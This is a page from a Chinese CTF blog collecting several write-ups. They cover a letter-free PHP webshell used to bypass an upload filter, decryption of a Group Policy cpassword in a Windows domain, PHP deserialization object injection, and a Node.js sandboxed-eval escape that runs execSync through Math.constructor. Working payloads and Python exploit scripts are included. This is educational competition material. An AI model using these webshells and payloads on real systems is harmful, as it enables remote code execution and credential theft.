                <span class="post-meta-item-text">本文字数：</span>
              <span>2.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="无数字字母的webshell"><a href="#无数字字母的webshell" class="headerlink" title="无数字字母的webshell"></a>无数字字母的webshell</h2><p>上传绕过，只需用短标签、P神的无数字字母的webshell绕过即可，上传文件名绕过因为是windows直接大小写绕过。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="php">&lt;?= $_=[] ?&gt; 
&lt;?= $_=@&quot;$_&quot; ?&gt;
&lt;?= $_=$_[(&#39;!&#39;==&#39;@&#39;)] ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ ?&gt;
&lt;?= $_______ = &quot;_&quot;.$__ ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ ?&gt;
&lt;?= $_______ .= $__ ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++  ?&gt;
&lt;?= $_______ .= $__  ?&gt;

&lt;?= ${$_______}[&quot;_&quot;](${$_______}[&quot;__&quot;]) ?&gt;</code></pre>
<h3 id="写小马："><a href="#写小马：" class="headerlink" title="写小马："></a>写小马：</h3><pre><code class="http">http://47.113.219.76/uploads/d8ffd2952b7416f6096c2481dfad4351/6539886cfe4730b929fa714a800aa44a_6.Php?_=system&amp;__=echo &quot;&lt;?php phpinfo()?&gt;&quot;&gt;&gt;1.php</code></pre>
<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p>上传cmd.exe后执行net user看到提示在<code>\\192.168.0.12\Hint</code></p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032004.png" alt="20200507032004"></p>
<p>看到一个压缩包里面有flag1和flag2的提示。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032131.png" alt="20200507032131"></p>
<h3 id="SYSVOL还原组策略中保存的密码"><a href="#SYSVOL还原组策略中保存的密码" class="headerlink" title="SYSVOL还原组策略中保存的密码"></a>SYSVOL还原组策略中保存的密码</h3><p>参考3gstudent的-<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">域渗透——利用SYSVOL还原组策略中保存的密码</a>。</p>
<p>在域中，存在一个默认的共享路径：</p>
<pre><code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></pre><p>这里的域可以在ipconfig /all下看到：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507022504.png" alt="20200507022504"></p>
<p>直接访问如下地址</p>
<pre><code>//De1CTF2020.lab/SYSVOL/De1CTF2020.lab/</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507022747.png" alt="20200507022747"></p>
<p>找到对应的策略组id配置文件，如下的Group.xml</p>
<pre><code>//De1CTF2020.lab/SYSVOL/De1CTF2020.lab/Policies/{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}/Machine/Preferences/Groups/</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507023026.png" alt="20200507023026"></p>
<p>简单的来说就是：<code>\SYSVOL</code>路径中保存了域内用户的一些配置信息-&gt;找到<code>HintZip_Pass</code>用户的配置信息-&gt;然后找到AES256加密的密钥，由于微软已经公开了私钥，那么就可以把这个登录密钥还原出来-&gt;最后解出压缩包。下面的cpasswd就是加密的秘钥</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032239.png" alt="20200507032239"></p>
<h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre><code class="powershell">function Get-DecryptedCpassword {
    [CmdletBinding()]
    Param (
        [string] $Cpassword 
    )

    try {
        #Append appropriate padding based on string length  
        $Mod = ($Cpassword.length % 4)

        switch ($Mod) {
        &#39;1&#39; {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
        &#39;2&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
        &#39;3&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
        }


        $Base64Decoded = [Convert]::FromBase64String($Cpassword)

        #Create a new AES .NET Crypto Object
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

        #Set IV to all nulls to prevent dynamic generation of IV value
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    } 

    catch {Write-Error $Error[0]}
}  
Get-DecryptedCpassword &quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;</code></pre>
<p>执行：</p>
<pre><code>powershell -executionpolicy bypass -file 1.ps1</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200507032803.png" alt="20200507032803"></p>
<p>压缩包的密码是：<code>zL1PpP@sSwO3d</code></p>
<p>得到flag:</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200507032939.png" alt="20200507032939"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d61b44424b.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d61b44424b.html" class="post-title-link" itemprop="url">2020安恒4月月赛web1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-04-27 16:51:38" itemprop="dateCreated datePublished" datetime="2020-04-27T16:51:38+08:00">2020-04-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:48:04" itemprop="dateModified" datetime="2020-10-14T17:48:04+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="2020安恒4月月赛web1-字符串逃逸导致对象注入"><a href="#2020安恒4月月赛web1-字符串逃逸导致对象注入" class="headerlink" title="2020安恒4月月赛web1-字符串逃逸导致对象注入"></a>2020安恒4月月赛web1-字符串逃逸导致对象注入</h2><p>首先看一个例子：</p>
<pre><code class="php">&lt;?php
$a=&#39;a:2:{i:0;s:6:&quot;tr1ple&quot;;i:1;s:5:&quot;aaaaa&quot;;}i:1;s:5:&quot;aaaaa&quot;;&#39;;
var_dump(unserialize($a));</code></pre>
<p>运行之后会发现以下几点:</p>
<ul>
<li>它能够正常反序列化</li>
<li>不存在的属性他也能反序列化</li>
</ul>
<p>其实这个和PHP反序列化的特性有关：</p>
<ul>
<li>反序列化时候以分号<code>;</code>作为字段的分隔符，以<code>}</code>作为结束。这也就是解释了上面的序列化值为什么能够正常反序列化，因为<code>}</code>作为了结束符。</li>
<li>类中不存在的属性亦能反序列化</li>
</ul>
<p><img src="https://goodcheerleung.gitee.io/blog/20200427170935.png" alt="20200427170935"></p>
<p>我们再看一个例子：</p>
<pre><code class="php">&lt;?php
function filter($string){
  $a = str_replace(&#39;x&#39;,&#39;zz&#39;,$string);
   return $a;
}
$username = &#39;tr1plexxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;}&#39;; 
$password=&quot;aaaaa&quot;;
$user = array($username, $password);
echo serialize($user);
echo &quot;\n&quot;;
$r = filter(serialize($user));
echo($r);
echo &quot;\n&quot;;

var_dump(unserialize($r));</code></pre>
<p>$user在序列化后会是:</p>
<pre><code class="php">a:2:{i:0;s:46:&quot;tr1plexxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre>
<p>这里我们可以发现第二个元素被解析称为aaaa,而<code>;i:1;s:6:&quot;123456&quot;;</code>被当做字符串处理了。</p>
<pre><code class="php">a:2:{i:0;s:46:&quot;tr1plezzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre>
<p>可以观察到x被替换称为两个z,其长度正好是<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code> 的1倍，也就是四十。</p>
<p>但是为什么它会忽略<code>&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code> 呢？因为PHP在反序列化时候是不仅仅是根据<code>}</code> 来判定反序列化块的范围，还是根据总字符的长度，原来的长度是80我们在加上20个字符之后正好将后面的给覆盖掉了。于是他只反序列化了前面的部分。</p>
<p>我们再看一个例子，结果却刚好和上面的结果相反：</p>
<pre><code class="php">&lt;?php
$r = &#39;a:2:{i:0;s:46:&quot;tr1plezzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}&#39;;
 $r = str_replace(&#39;zzzzzzz&#39;, chr(0).&#39;*&#39;.chr(0), $r);
 echo $r;
var_dump(unserialize($r));</code></pre>
<p>上面代码替换会减少一半导致:<code>;i:1;s:6:&quot;123456&quot;;}&quot;</code> 被吞掉导致最后结果如下：</p>
<p><img src="https://goodcheerleung.gitee.io/blog/20200427205958.png" alt="20200427205958"></p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code class="php"> &lt;?php
show_source(&quot;index.php&quot;);
function write($data) {
    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);
}

function read($data) {
    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);
}

class A{
    public $username;
    public $password;
    function __construct($a, $b){
        $this-&gt;username = $a;
        $this-&gt;password = $b;
    }
}

class B{
    public $b = &#39;gqy&#39;;
    function __destruct(){
        $c = &#39;a&#39;.$this-&gt;b;
        echo $c;
    }
}

class C{
    public $c;
    function __toString(){
        //flag.php
        echo file_get_contents($this-&gt;c);
        return &#39;nice&#39;;
    }
}

$a = new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);
//省略了存储序列化数据的过程,下面是取出来并反序列化的操作
$b = unserialize(read(write(serialize($a)))); </code></pre>
<p>这道题和上面的道理一样，这里我们无需考虑<code>类A</code> 只需要考虑B和C。</p>
<p>我们生成一个序列化之后的结果：</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></pre>
<p>我们看我们要吞掉的内容明显是<code>;s:8:&quot;password&quot;</code> 这一块，我们可以传入<code>;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code> 拼接起来成这样：</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:72:&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;</code></pre>
<p>但是这样是无法getflag的，因为我们传入的payload被<code>&quot;</code> 包裹所以我们要添加一个双引号进行逃逸。</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:73:&quot;&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;</code></pre>
<p>那么现在我们需要吞并掉的就是<code>;s:8:&quot;password&quot;;s:73:&quot;&quot;</code> ,但是这个长度实23没法整除2，我们需要添加一个字符加起来24.</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:73:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;</code></pre>
<p>所以我们最终会构成一个这样的序列化字符块：</p>
<pre><code class="php">O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:48:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;s:8:&quot;password&quot;;s:74:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}&quot;;}</code></pre>
<p>因为需要逃逸24个字符，所以需要48个长度的<code>\0</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d5efc80b37.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d5efc80b37.html" class="post-title-link" itemprop="url">NPUCTF2020 验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-04-25 00:47:35" itemprop="dateCreated datePublished" datetime="2020-04-25T00:47:35+08:00">2020-04-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:28:23" itemprop="dateModified" datetime="2020-10-14T17:28:23+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>4.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ul>
<li>我们用一段代码来看再JavaScript中的类型比较：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424150332.png" alt="20200424150332"></p>
<ul>
<li><p>可以看到数组<code>[1]==1</code>在两个等于号时候是返回true的，而在三个等于号时候会返回false。这一点是和php一样的。</p>
</li>
<li><p>而在JavaScript中各个数据类型的相加呢？</p>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424162607.png" alt="20200424162607"></p>
<p>可以看到对象和字符串相加最后得到的是字符串。而数组和字符串相加最后也是得到字符串。所以可以基本得出结论就是，<strong>node中任何数据类型和字符串相加最后得到的都是字符串</strong>。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424180609.png" alt="20200424180609"></p>
<p>而长度<code>length</code> 属性对于字符串是返回字符串长度，而数组是返回数组元素个数。而数字是没有<code>length</code> 的。</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424215524.png" alt="20200424215524"></p>
<h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><pre><code class="javascript">app.post(&#39;/&#39;, function (req, res) {
  let result = &#39;&#39;;
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || &#39;Wrong Wrong Wrong!!!&#39;;
      } catch (e) {
        console.log(e);
        result = &#39;Wrong Wrong Wrong!!!&#39;;
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift(&#39;Not verified!&#39;);
  }
  if (results.length &gt; 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});</code></pre>
<p>以这道题为例:</p>
<h3 id="hash绕过"><a href="#hash绕过" class="headerlink" title="hash绕过"></a>hash绕过</h3><p>要满足<code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code> 结合上面的结论我们我们想要<code>first</code> 和<code>second</code> 长度一样而他们内容又不相等，但是他们md5加盐后的值又要相等。可以构造如下payload：</p>
<pre><code>{&quot;e&quot;:paylod,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}</code></pre><p>这是因为数组利用了<strong>任何数据类型加上字符串都会转变称为字符串的特性</strong>。同时数组和字符串的长度都是1但是他们却不全等。</p>
<pre><code class="python">import requests
import json
headers = {
    &quot;Content-Type&quot;:&quot;application/json&quot;
}
url = &quot;http://ff8efecb-b1bc-4df1-af3d-249b285a0c54.node3.buuoj.cn/&quot;
data = {&quot;e&quot;:&#39;paylod&#39;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}
r = requests.post(url,data=json.dumps(data),headers=headers)
print(r.text)</code></pre>
<p>这道题的第二关我一直没做出来,虽然看正则就知道是用math去RCE。</p>
<h3 id="构造函数执行任意代码"><a href="#构造函数执行任意代码" class="headerlink" title="构造函数执行任意代码"></a>构造函数执行任意代码</h3><p>题目关键代码：</p>
<pre><code class="javascript">function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#39;&#39;)) {
    return null;
  }
  return eval(str);
}</code></pre>
<p>从正则可以看出只能嵌套Math而且Math只能用一个点，也就是只能用一层属性。</p>
<p>我们再来看最终的payload:</p>
<pre><code class="javascript">(Math=&gt;(
    Math=Math.constructor,
    Math.x=Math.constructor(
        Math.fromCharCode(
114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41)
        )()))(Math+1)</code></pre>
<p><code>Math=&gt;</code> 是什么意思？我们来看个简单的例子：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424231655.png" alt="20200424231655"></p>
<p>可以发现最终是生成了个函数。是的这就是我们熟悉的匿名函数。<code>x =&gt; x * x</code> 相当于：</p>
<pre><code class="javascript">function (x) {
    return x * x;
}</code></pre>
<p>同理<code>a = x=&gt;x*x</code> 相当于命名了一个名字为a的函数：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424231946.png" alt="20200424231946"></p>
<p>那么<code>(x=&gt;x+x)(2)</code>呢其实就相当于往这个函数里面传入参数2：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200424235002.png" alt="20200424235002"></p>
<p>我们再回到payload本身<code>(Math=Math.constructor,Math.x=Math.constructor(......))</code> 可以清楚地看到最外层括号是一个逗号运算，而逗号运算我们知道是从左往右运算再最后返回最右边的值。我们由此得知这里是执行这么个运算：</p>
<pre><code class="javascript">Math.constructor.constructor(.....)</code></pre>
<p>而这又是什么呢，我们直接逐层测试的<code>Math.constructor</code> ：</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425002236.png" alt="20200425002236"></p>
<p>可以见到第一层返回的<code>function object()</code>,他是function的对象原型，而我们知道Object的构造器是指向Function的所以第二层会出现Function。而Function是构造函数他能够创建函数。可以简单理解他和eval类似。我们可以测试一个例子：</p>
<pre><code class="javascript">var sum = Math.constructor.constructor(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;);
sum(1,2);
var fun = new Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;);
fun(1,2)</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425003241.png" alt="20200425003241"></p>
<p>可以直接看到结果，<code>Math.constructor.constructor()</code> 和构造函数<code>new Function()</code> 是等效的。当然这个不知在Math中其他任意函数应该也是类似的。例如：alert()</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425003702.png" alt="20200425003702"></p>
<p>而payload的最里面<code>fromCharCode</code>就很容易理解了就是把AIISC码转换为字符串,那么生成payload脚本如下：</p>
<pre><code class="python">import re
encode = lambda code: list(map(ord,code))
decode = lambda code: &quot;&quot;.join(map(chr,code))
a=f&quot;&quot;&quot;
(m0=&gt;(
        m0=m0.constructor,
        m0.x=m0.constructor(
            m0.fromCharCode({encode(&quot;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;)&quot;)})
        )()
    ))(Math+1)
&quot;&quot;&quot;
a=re.sub(r&quot;[\s\[\]]&quot;, &quot;&quot;, a).replace(&quot;m0&quot;,&quot;Math&quot;)
print(a)
</code></pre>
<h3 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h3><pre><code class="python">import requests
import json
headers = {
    &quot;Content-Type&quot;:&quot;application/json&quot;
}
url = &quot;http://14b5ae3b-e444-4e5b-9e2b-1ba3100fc085.node3.buuoj.cn/&quot;
data = {&quot;e&quot;:&#39;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#39;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}
r = requests.post(url,data=json.dumps(data),headers=headers)
print(r.text)</code></pre>
<p>GETFLAG:</p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200425004237.png" alt="20200425004237"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d44a4997a7.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d44a4997a7.html" class="post-title-link" itemprop="url">记一次MISC二维码的修复</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-04-24 13:12:50" itemprop="dateCreated datePublished" datetime="2020-04-24T13:12:50+08:00">2020-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:26:31" itemprop="dateModified" datetime="2020-10-14T17:26:31+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>103</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>二维码是个一半的二维码。</p>
<p><img src="https://goodcheerleung.gitee.io/blog/qrcode1.png" alt="qcode"></p>
<p>用qrazybox/进行修复（<a href="https://merricx.github.io/qrazybox/）就是把二维码全部涂上去，然后Tools" target="_blank" rel="noopener">https://merricx.github.io/qrazybox/）就是把二维码全部涂上去，然后Tools</a> - Extract QR Information</p>
<p><img src="https://goodcheerleung.gitee.io/blog/20200424130627.png" alt="2"></p>
<p><img src="https://goodcheerleung.gitee.io/blog/20200424130839.png" alt="20200424130839.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d3e8844c56.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d3e8844c56.html" class="post-title-link" itemprop="url">JavaScript原型链污染学习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-04-24 10:46:55" itemprop="dateCreated datePublished" datetime="2020-04-24T10:46:55+08:00">2020-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:47:36" itemprop="dateModified" datetime="2020-10-14T17:47:36+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
